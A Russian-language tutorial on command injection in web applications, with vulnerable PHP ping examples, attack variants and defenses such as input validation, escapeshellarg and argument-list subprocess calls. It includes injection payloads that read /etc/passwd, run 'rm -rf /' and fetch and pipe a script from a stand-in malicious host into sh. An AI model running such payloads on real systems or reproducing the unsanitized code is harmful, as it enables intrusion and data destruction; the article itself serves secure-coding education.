**Инъекция команд (Command Injection)** — это вид уязвимости, при которой злоумышленник может выполнить произвольные системные команды на сервере, используя уязвимости в веб-приложении. Это возможно, когда приложение передаёт пользовательский ввод в командную оболочку (например, bash, cmd) без должной фильтрации и экранирования. Инъекция команд часто используется для получения полного контроля над сервером, кражи данных или нарушения его работы.

### Как работает Command Injection?

Инъекция команд происходит, когда серверное приложение динамически формирует и выполняет системные команды с использованием входных данных от пользователя. Если эти данные не проверяются, злоумышленник может подставить свои команды и заставить сервер их выполнить.

#### Пример работы

Рассмотрим веб-приложение, которое предоставляет пользователю возможность пинговать IP-адреса через веб-интерфейс:

```php
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
```

В этом примере код принимает IP-адрес через параметр `GET` и вставляет его в команду `ping`. Если пользователь введёт обычный IP-адрес, команда будет выполнена корректно. Однако злоумышленник может вместо IP-адреса передать следующее:

```
127.0.0.1; ls
```

В результате сервер выполнит не только команду `ping`, но и команду `ls`, которая выведет список файлов на сервере. Злоумышленник может вставить любую другую системную команду.

### Примеры атак Command Injection

1. **Использование специальных символов**:
   Символы, такие как `;`, `&&`, `||`, позволяют злоумышленникам цеплять дополнительные команды к исходной:

   - `;` — выполняет команды последовательно (например, `ping 127.0.0.1; rm -rf /`).
   - `&&` — выполняет вторую команду, только если первая завершится успешно (например, `ping 127.0.0.1 && ls`).
   - `||` — выполняет вторую команду, если первая завершилась с ошибкой (например, `ping 127.0.0.1 || echo "Error occurred"`).

2. **Объединение команд**:
   Злоумышленник может использовать пайпы `|` для передачи вывода одной команды в другую (например, `ping 127.0.0.1 | grep "64 bytes"`).

3. **Перенаправление вывода**:
   Команды могут перенаправить вывод или ошибки в файлы с помощью символов `>` и `2>`. Это может быть использовано для записи данных в критические системные файлы (например, `ping 127.0.0.1 > /tmp/log.txt`).

4. **Запуск шелл-скриптов**:
   Злоумышленники могут использовать инъекцию команд для выполнения целых скриптов:

   ```bash
   ; curl http://malicious-site.com/script.sh | sh
   ```

### Виды Command Injection

1. **Blind Command Injection (Слепая инъекция команд)**:
   В этом случае злоумышленник не видит результата выполнения команды напрямую, но всё же может понять, что команда была выполнена, через побочные эффекты, например, изменение системы или отправку данных на сторонний сервер.

2. **Classic Command Injection (Классическая инъекция команд)**:
   Злоумышленник может напрямую видеть вывод команды в ответе веб-приложения. Например, если введённые команды возвращают результат прямо на страницу сайта.

### Пример сценария Command Injection

Предположим, веб-приложение позволяет пользователю вводить IP-адрес для проверки доступности удалённого хоста через `ping`. Приложение передаёт этот IP-адрес в системную команду:

```php
$ip = $_POST['ip'];
exec("ping -c 4 " . $ip);
```

Злоумышленник вводит следующее значение в поле ввода:

```
127.0.0.1; cat /etc/passwd
```

Команда `ping -c 4 127.0.0.1; cat /etc/passwd` будет выполнена на сервере, и содержимое файла `/etc/passwd` (список пользователей на сервере) будет выведено. Это может привести к краже данных или дальнейшему исследованию системы злоумышленником.

### Последствия Command Injection

- **Получение полного контроля над сервером**: Злоумышленник может выполнить любые команды, получив доступ к системе, базе данных или другим критически важным ресурсам.
- **Кража конфиденциальных данных**: Команды могут позволить злоумышленнику просматривать конфиденциальные файлы или извлекать данные.
- **Установка вредоносного ПО**: Через командную инъекцию возможно загрузить и выполнить вредоносные программы, такие как трояны или программы-вымогатели.
- **Удаление или модификация данных**: Злоумышленник может выполнить команды для удаления или изменения данных на сервере.
- **Отказ в обслуживании**: Выполнение команд, например, для удаления важных файлов, может привести к остановке работы веб-приложения.

### Как защититься от Command Injection?

1. **Фильтрация и валидация входных данных**:
   Никогда не доверяйте входным данным от пользователей. Всегда валидируйте и фильтруйте данные. Например, проверяйте, что вводимые значения соответствуют ожидаемому формату (IP-адрес, числовые значения и т.д.).

   Пример валидации IP-адреса в PHP:

   ```php
   if (filter_var($ip, FILTER_VALIDATE_IP)) {
       // Выполнение команды
   } else {
       echo "Неверный IP";
   }
   ```

2. **Экранирование данных**:
   Используйте функции для безопасного выполнения команд, такие как `escapeshellcmd()` и `escapeshellarg()` в PHP, которые экранируют специальные символы и предотвращают инъекции.

   ```php
   $ip = escapeshellarg($_GET['ip']);
   system("ping -c 4 " . $ip);
   ```

3. **Использование специализированных библиотек**:
   Вместо того чтобы напрямую выполнять системные команды, используйте функции или библиотеки, которые предоставляют безопасные API для выполнения задач (например, выполнение сетевых операций через библиотеки, а не через системные команды).

4. **Ограничение прав доступа**:
   Приложение и сервер должны работать с минимальными привилегиями. Если злоумышленник сможет выполнить команду, он не должен получить доступ к критическим системным файлам или функциям.

5. **Использование `subprocess` в Python**:
   В Python можно использовать безопасные функции, такие как `subprocess.run()`, которые позволяют передавать аргументы отдельно, избегая риска инъекций.

   Пример:

   ```python
   import subprocess
   subprocess.run(["ping", "-c", "4", ip_address], check=True)
   ```

6. **Обновление ПО и фреймворков**:
   Всегда обновляйте программное обеспечение и используемые фреймворки до актуальных версий, чтобы избежать использования уязвимостей, известных злоумышленникам.

7. **Использование инструментов мониторинга и анализа**:
   Инструменты анализа логов и мониторинга безопасности могут помочь обнаружить подозрительные действия и предотвращать атаки на ранних этапах.

### Заключение

Инъекция команд — это опасная уязвимость, которая может привести к катастрофическим последствиям, таким как кража данных, полный контроль над сервером или разрушение инфраструктуры. Основные меры защиты включают валидацию входных данных, экранирование команд, использование специализированных библиотек и ограничение прав доступа.